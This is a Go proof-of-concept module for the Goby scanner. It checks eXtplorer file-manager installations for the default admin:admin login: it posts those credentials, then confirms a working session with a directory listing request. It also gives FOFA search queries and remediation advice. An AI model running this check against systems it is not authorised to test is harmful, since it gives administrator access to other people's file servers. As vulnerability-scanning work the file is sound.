package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "EXtplorer default password vulnerability",
    "Description": "<p>EXtplorer is a file manager based on PHP applications, which operates through web pages to edit, copy, move, delete files and directories, and even modify file permission properties.</p><p>Attackers can control the entire platform through default password admin:admin vulnerabilities and operate core functions with administrator privileges.</p>",
    "Product": "eXtplorer",
    "Homepage": "http://extplorer.net/",
    "DisclosureDate": "2023-03-05",
    "Author": "sunying",
    "FofaQuery": "title=\"eXtplorer\" || (body=\"selectOnFocus:true\" && body=\"eXtplorer\")",
    "GobyQuery": "title=\"eXtplorer\" || (body=\"selectOnFocus:true\" && body=\"eXtplorer\")",
    "Level": "2",
    "Impact": "<p>Attackers can control the entire platform through default password vulnerabilities and operate core functions with administrator privileges.</p>",
    "Recommendation": "<p>1. Change the default password, which should preferably include uppercase and lowercase letters, numbers, and special characters, with more than 8 digits.</p><p>2. If not necessary, prohibit public network access to the system.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
    "References": [
        "http://extplorer.net/"
    ],
    "Is0day": false,
    "HasExp": false,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "logon",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": []
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": []
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Default Password"
    ],
    "VulType": [
        "Default Password"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "eXtplorer 默认口令漏洞",
            "Product": "eXtplorer",
            "Description": "<p>eXtplorer是一款基于php应用的文件管理器，通过web页面进行操作，对文件和目录进行编辑、复制、移动和删除等操作，甚至还能修改文件的权限属性。</p><p>攻击者可以通过默认密码 admin:admin 漏洞控制整个平台，并以管理员权限操作核心功能。</p>",
            "Recommendation": "<p>1、修改默认口令，密码最好包含大小写字母、数字和特殊字符等，且位数大于8位。<br></p><p>2、如非必要，禁止公网访问该系统。<br></p><p>3、通过防火墙等安全设备设置访问策略，设置白名单访问。<br></p>",
            "Impact": "<p>攻击者可以通过默认密码漏洞控制整个平台，并以管理员权限操作核心功能。<br></p>",
            "VulType": [
                "默认口令"
            ],
            "Tags": [
                "默认口令"
            ]
        },
        "EN": {
            "Name": "EXtplorer default password vulnerability",
            "Product": "eXtplorer",
            "Description": "<p>EXtplorer is a file manager based on PHP applications, which operates through web pages to edit, copy, move, delete files and directories, and even modify file permission properties.</p><p>Attackers can control the entire platform through default password admin:admin vulnerabilities and operate core functions with administrator privileges.</p>",
            "Recommendation": "<p>1. Change the default password, which should preferably include uppercase and lowercase letters, numbers, and special characters, with more than 8 digits.</p><p>2. If not necessary, prohibit public network access to the system.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
            "Impact": "<p>Attackers can control the entire platform through default password vulnerabilities and operate core functions with administrator privileges.<br></p>",
            "VulType": [
                "Default Password"
            ],
            "Tags": [
                "Default Password"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PostTime": "2023-11-24",
    "PocId": "10886"
}`

	accountLoginSDOIUAJODEW := func(hostInfo *httpclient.FixUrl) (bool, error) {
		sendConfig := httpclient.NewPostRequestConfig("/index.php")
		sendConfig.VerifyTls = false
		sendConfig.FollowRedirect = false
		sendConfig.Header.Store("Cookie", "eXtplorer=4tyYMU22AsEoO5k8PRE0KcEuiN4mQ700")
		sendConfig.Header.Store("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
		sendConfig.Header.Store("X-Requested-With", "XMLHttpRequest")
		sendConfig.Data = "option=com_extplorer&action=login&type=extplorer&username=admin&password=admin&lang=simplified_chinese"
		resp, err := httpclient.DoHttpRequest(hostInfo, sendConfig)
		return err == nil && resp.StatusCode == 200 && strings.Contains(resp.RawBody, "'success':true"), err
	}

	verifyLoginCookieIOSAJDUIWJD := func(hostInfo *httpclient.FixUrl) bool {
		postReuqestConfig := httpclient.NewPostRequestConfig("/index.php")
		postReuqestConfig.Header.Store("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
		postReuqestConfig.Header.Store("Origin", hostInfo.HostInfo)
		postReuqestConfig.VerifyTls = false
		postReuqestConfig.FollowRedirect = false
		postReuqestConfig.Header.Store("Referer", hostInfo.HostInfo)
		postReuqestConfig.Header.Store("Accept", "*/*")
		postReuqestConfig.Header.Store("Cookie", "eXtplorer=4tyYMU22AsEoO5k8PRE0KcEuiN4mQ700")
		postReuqestConfig.Data = "option=com_extplorer&action=getdircontents&dir=&sendWhat=dirs&node=ext_root"
		resp, err := httpclient.DoHttpRequest(hostInfo, postReuqestConfig)
		return err == nil && resp != nil && strings.Contains(resp.Utf8Html, "is_writable") && strings.Contains(resp.Utf8Html, "is_chmodable") && strings.Contains(resp.Utf8Html, "is_deletable")
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			loginStatus, err := accountLoginSDOIUAJODEW(hostInfo)
			if err != nil || !loginStatus {
				return false
			}
			if verifyLoginCookieIOSAJDUIWJD(hostInfo) {
				ss.VulURL = fmt.Sprintf("%s://admin:admin@%s:%s", hostInfo.Scheme(), hostInfo.IP, hostInfo.Port)
				return true
			}
			return false
		}, nil,
		//func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
		//	attackType := goutils.B2S(stepLogs.Params["attackType"])
		//	if attackType == "logon" {
		//		successfullyVerifiedLogin, err := accountLoginSDOIUAJODEW(expResult.HostInfo)
		//		if err != nil {
		//			expResult.Success = false
		//			expResult.Output = err.Error()
		//		} else if successfullyVerifiedLogin.StatusCode == 200 && strings.Contains(successfullyVerifiedLogin.RawBody, "'success':true") {
		//			expResult.Success = true
		//			expResult.Output = "Cookie：" + successfullyVerifiedLogin.Cookie
		//			return expResult
		//		} else {
		//			expResult.Output = "漏洞利用失败！"
		//			expResult.Success = false
		//		}
		//	} else {
		//		expResult.Output = `未知的利用方式`
		//	}
		//	return expResult
		//}
	))
}
